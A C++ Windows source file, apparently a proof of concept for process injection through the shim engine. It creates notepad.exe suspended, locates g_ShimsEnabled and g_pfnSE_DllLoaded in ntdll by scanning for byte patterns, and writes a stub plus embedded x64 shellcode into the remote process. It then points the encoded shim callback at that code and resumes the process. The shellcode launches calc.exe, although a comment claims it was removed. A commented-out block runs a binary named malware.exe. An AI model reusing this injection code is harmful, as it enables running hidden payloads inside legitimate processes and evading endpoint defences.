
#include <iostream>
#include <Windows.h>
#include <cstdint>
#include <cstring>

#include "test.h"

#define U_PTR(x) (reinterpret_cast<ULONG_PTR>(x))
#define C_PTR(x) (reinterpret_cast<PVOID>(x))

struct SymbolAddresses {
    PVOID g_pfnSE_DllLoaded;
    PVOID g_ShimsEnabled;
};

LPVOID encode_system_ptr(LPVOID ptr) {
    // get pointer cookie from SharedUserData!Cookie (0x330)
    ULONG cookie = *(ULONG*)0x7FFE0330;

    // encrypt our pointer so it'll work when written to ntdll
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

using namespace std;

unsigned char stub_x64[] = {
    0x48, 0x83, 0xec, 0x38,                          // sub rsp, 38h
    0x33, 0xc0,                                      // xor eax, eax
    0x45, 0x33, 0xc9,                                // xor r9d, r9d
    0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax

    0x48, 0xba,                                      // 
    0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov rdx, 8888888888888888h

    0xa2,                                            // (offset: 25)
    0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov ds:9999999999999999h, al

    0x49, 0xb8,                                      // 
    0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // mov r8, 7777777777777777h

    0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]

    0x48, 0xb8,                                      // 
    0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h

    0xff, 0xd0,                                      // call rax
    0x33, 0xc0,                                      // xor eax, eax
    0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
    0xc3                                             // retn
};

// Shellcode removed as requested

SymbolAddresses ResolvePointers() {
    SymbolAddresses result = { nullptr, nullptr };

    // Get the address of RtlQueryDepthSList in ntdll.dll
    FARPROC rtlQueryDepthSList = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlQueryDepthSList");
    if (!rtlQueryDepthSList) {
        cout << "[-] Failed to get RtlQueryDepthSList" << endl;
        return result;
    }

    cout << "[i] RtlQueryDepthSList: 0x" << hex << (uintptr_t)rtlQueryDepthSList << endl;

    // Scan until finding the end of LdrpInitShimEngine
    PBYTE tmp = (PBYTE)rtlQueryDepthSList;
    int i = 0;
    const int maxScan = 1000; // Safety limit
    int scanCount = 0;

    // Look for patterns 0xC3CC or 0xCCC3 (ending instructions)
    while (i != 2 && scanCount < maxScan) {
        UINT16 current = *(UINT16*)tmp;
        if (current == 0xC3CC || current == 0xCCC3) {
            i++;
            cout << "[+] Found end pattern " << i << " at 0x" << hex << (uintptr_t)tmp << endl;
        }
        tmp++;
        scanCount++;
    }

    if (scanCount >= maxScan) {
        cout << "[-] Failed to find LdrpInitShimEngine end" << endl;
        return result;
    }

    scanCount = 0;

    // Scan until finding 0x488B3D: mov rdi, qword ptr [rip+offset] (g_pfnSE_DllLoaded)
    while ((*(UINT32*)tmp & 0xFFFFFF) != 0x3D8B48 && scanCount < maxScan) {
        tmp++;
        scanCount++;
    }

    if (scanCount >= maxScan) {
        cout << "[-] Failed to find g_pfnSE_DllLoaded pattern" << endl;
        return result;
    }

    // Get the offset for g_pfnSE_DllLoaded
    INT32 offset1 = *(INT32*)(tmp + 3);
    result.g_pfnSE_DllLoaded = (PVOID)(tmp + offset1 + 7);

    scanCount = 0;

    // Scan until finding 0x443825: cmp byte ptr [rip+offset], r12b (g_ShimsEnabled)
    while ((*(UINT32*)tmp & 0xFFFFFF) != 0x253844 && scanCount < maxScan) {
        tmp++;
        scanCount++;
    }

    if (scanCount >= maxScan) {
        cout << "[-] Failed to find g_ShimsEnabled pattern" << endl;
        return result;
    }

    // Get the offset for g_ShimsEnabled
    INT32 offset2 = *(INT32*)(tmp + 3);
    result.g_ShimsEnabled = (PVOID)(tmp + offset2 + 7);

    cout << "[i] g_ShimsEnabled:    0x" << hex << (uintptr_t)result.g_ShimsEnabled << endl;
    cout << "[i] g_pfnSE_DllLoaded: 0x" << hex << (uintptr_t)result.g_pfnSE_DllLoaded << endl;

    return result;
}


PVOID MmPeSectionBase(_In_ PVOID ModuleBase, _In_ PCHAR SectionName) {
    PIMAGE_DOS_HEADER     DosHeader = {};
    PIMAGE_NT_HEADERS     NtHeader = {};
    PIMAGE_SECTION_HEADER SecHeader = {};

    DosHeader = static_cast<PIMAGE_DOS_HEADER>(ModuleBase);
    NtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(U_PTR(ModuleBase) + DosHeader->e_lfanew);
    SecHeader = IMAGE_FIRST_SECTION(NtHeader);

    for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
        if (memcmp(SectionName, SecHeader[i].Name, strlen(SectionName)) == 0) {
            return C_PTR(U_PTR(ModuleBase) + SecHeader[i].VirtualAddress);
        }
    }

    return nullptr;
}

// New structure for symbol search results
struct SymbolResult {
    PVOID g_pfnSE_DllLoaded;
    PVOID g_ShimsEnabled;
};

// Function to search for symbols in the .text section (dynamic scanning)
SymbolResult FindSymbols(const PBYTE textBase, size_t textSize) {
    SymbolResult result = { nullptr, nullptr };
    size_t scanCount = 0;

    // Search for g_pfnSE_DllLoaded by instruction pattern: 48 8B 3D XX XX XX XX (mov rdi, qword ptr [rip+offset])
    while (scanCount < textSize - 7) {
        if ((textBase[scanCount] == 0x48) &&
            (textBase[scanCount + 1] == 0x8B) &&
            (textBase[scanCount + 2] == 0x3D)) {

            int32_t offset;
            memcpy(&offset, textBase + scanCount + 3, sizeof(offset));

            result.g_pfnSE_DllLoaded = reinterpret_cast<PVOID>(
                reinterpret_cast<uintptr_t>(textBase + scanCount + 7 + offset));

            // If we've found both, we're done
            if (result.g_ShimsEnabled) break;
        }

        // Search for g_ShimsEnabled by pattern: 44 38 25 XX XX XX XX (cmp byte ptr [rip+offset], r12b)
        if ((textBase[scanCount] == 0x44) &&
            (textBase[scanCount + 1] == 0x38) &&
            (textBase[scanCount + 2] == 0x25)) {

            int32_t offset;
            memcpy(&offset, textBase + scanCount + 3, sizeof(offset));

            result.g_ShimsEnabled = reinterpret_cast<PVOID>(
                reinterpret_cast<uintptr_t>(textBase + scanCount + 7 + offset));

            // If we've found both, we're done
            if (result.g_pfnSE_DllLoaded) break;
        }

        scanCount++;
    }

    return result;
}

// Function to verify found symbols
void ValidateSymbols(const char* name, PVOID address, HANDLE process = nullptr) {
    if (!address) {
        cout << "[-] " << name << " was not found" << endl;
        return;
    }

    HANDLE targetProcess = process ? process : GetCurrentProcess();
    MEMORY_BASIC_INFORMATION mbi;

    if (VirtualQueryEx(targetProcess, address, &mbi, sizeof(mbi)) == 0) {
        cout << "[-] Error querying memory for " << name << ": " << GetLastError() << endl;
        return;
    }

    bool writable = (mbi.Protect & PAGE_READWRITE) || (mbi.Protect & PAGE_EXECUTE_READWRITE);
    cout << "[+] " << name << " found at: " << address
        << " | Writable: " << (writable ? "Yes" : "No") << endl;
}



int testmain()
{
    // 1. Create Suspended Process
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    if (!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe", // Application name
        NULL,                              // Command line
        NULL,                              // Process handle not inheritable
        NULL,                              // Thread handle not inheritable
        FALSE,                             // Set handle inheritance to FALSE
        CREATE_SUSPENDED,                  // Creation flags
        NULL,                              // Use parent's environment block
        NULL,                              // Use parent's starting directory 
        &si,                               // Pointer to STARTUPINFO structure
        &pi))                              // Pointer to PROCESS_INFORMATION structure
    {
        cout << "Failed to create suspended process" << endl;
        return 0;
    }

    CONTEXT ctx = { 0 };
    si.cb = sizeof(si);
    ctx.ContextFlags = CONTEXT_FULL;
    // 1. 获取线程上下文
    if (!GetThreadContext(pi.hThread, &ctx)) 
    {
        printf("[-] GetThreadContext failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] GetThreadContext succeed\n");


    // 2. Resolve the addresses of g_ShimsEnabled and g_pfnSE_DllLoaded directly
    SymbolAddresses symbols = ResolvePointers();

    if (!symbols.g_pfnSE_DllLoaded || !symbols.g_ShimsEnabled) {
        cout << "[-] Failed to locate required symbols" << endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Get the address of NtQueueApcThread
    PVOID ptrNtQueueAPC = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    if (!ptrNtQueueAPC) {
        cout << "[-] Failed to locate NtQueueApcThread" << endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // 3. Inject the stub and shellcode
    // For this example, let's assume we have payload/shellcode variable defined elsewhere
    unsigned char shellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
    0x65, 0x78, 0x65, 0x00 }; // Shellcode removed as requested

    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(stub_x64) + sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        cout << "[-] Failed to allocate memory" << endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    SIZE_T stubSize = sizeof(stub_x64);
    SIZE_T payloadSize = sizeof(shellcode);

    // Remote payload memory address
    PVOID remotePayload = (PBYTE)mem + stubSize;

    // Context address, optional (can be NULL)
    PVOID ptrContext = nullptr;

    cout << "[*] g_ShimsEnabled    : " << symbols.g_ShimsEnabled << endl;
    cout << "[*] g_pfnSE_DllLoaded : " << symbols.g_pfnSE_DllLoaded << endl;
    cout << "[*] Payload location  : " << remotePayload << endl;
    cout << "[*] NtQueueApcThread  : " << ptrNtQueueAPC << endl;

    // Copy values into the stub at their offsets:
    memcpy(&stub_x64[16], &remotePayload, sizeof(PVOID));    // MmPayload
    memcpy(&stub_x64[25], &symbols.g_ShimsEnabled, sizeof(PVOID));   // g_ShimsEnabled
    memcpy(&stub_x64[35], &ptrContext, sizeof(PVOID));       // MmContext (nullptr)
    memcpy(&stub_x64[49], &ptrNtQueueAPC, sizeof(PVOID));    // NtQueueApcThread

    // Write stub and shellcode to process memory
    SIZE_T bytesWritten;
    BOOL ok1 = WriteProcessMemory(pi.hProcess, mem, stub_x64, stubSize, &bytesWritten);
    BOOL ok2 = WriteProcessMemory(pi.hProcess, (PBYTE)mem + stubSize, shellcode, payloadSize, &bytesWritten);

    if (!ok1 || !ok2) {
        cout << "[-] Failed to write payloads to memory: " << GetLastError() << endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Enable Shims
    BYTE enableShims = TRUE;
    if (!WriteProcessMemory(pi.hProcess, symbols.g_ShimsEnabled, &enableShims, sizeof(BYTE), nullptr)) {
        printf("[-] WriteProcessMemory to g_ShimsEnabled Failed: %lx\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }


    LPVOID tmp = encode_system_ptr(mem);
    // Set the g_pfnSE_DllLoaded hook to point to our stub
    if (!WriteProcessMemory(pi.hProcess, symbols.g_pfnSE_DllLoaded, &tmp, sizeof(PVOID), nullptr)) {
        printf("[-] WriteProcessMemory to g_pfnSE_DllLoaded Failed: %lx\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // After writing to g_pfnSE_DllLoaded
    PVOID verifyPtr = nullptr;
    if (!ReadProcessMemory(pi.hProcess, symbols.g_pfnSE_DllLoaded, &verifyPtr, sizeof(PVOID), nullptr)) {
        printf("[-] Failed to verify g_pfnSE_DllLoaded write: %lx\n", GetLastError());
    }
    else if (verifyPtr != mem) {
        printf("[-] g_pfnSE_DllLoaded verification failed: Expected %p, got %p\n", mem, verifyPtr);
    }
    else {
        printf("[+] g_pfnSE_DllLoaded successfully modified\n");
    }


    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] SetThreadContext failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] get input run resume targetPID %d\n", pi.dwProcessId);

    // Resume the suspended process
    if (ResumeThread(pi.hThread) == -1) {
        printf("[-] ResumeThread Failed: %ld\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    cout << "[+] Process resumed, injection complete" << endl;

    // Release handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

/*
#include <Windows.h>
#include <stdio.h>

int testmain()
{
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOW si = {0};

    CreateProcessW(
        L"D:\\lenvov的笔记们\\vssource_rope\\proc_tamper_POC\\Proc_tamper_vsrepo\\备份POC源码\\process_ghosting-1.0\\build\\Release\\malware.exe", // Application name
        //NULL,                              // Command line
        (LPWSTR)L"C:\\Windows\\System32\\notepad.exe",
        NULL,                              // Process handle not inheritable
        NULL,                              // Thread handle not inheritable
        FALSE,                             // Set handle inheritance to FALSE
        //CREATE_SUSPENDED,                  // Creation flags
        NULL,
        NULL,                              // Use parent's environment block
        NULL,                              // Use parent's starting directory 
        &si,                               // Pointer to STARTUPINFO structure
        &pi);                          // Pointer to PROCESS_INFORMATION structure

    Sleep(10);
    printf("suspend\n");
    SuspendThread(pi.hThread);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);


    printf("input to resume\n");
    getchar();
    ResumeThread(pi.hThread);

    
    return 0;
}
*/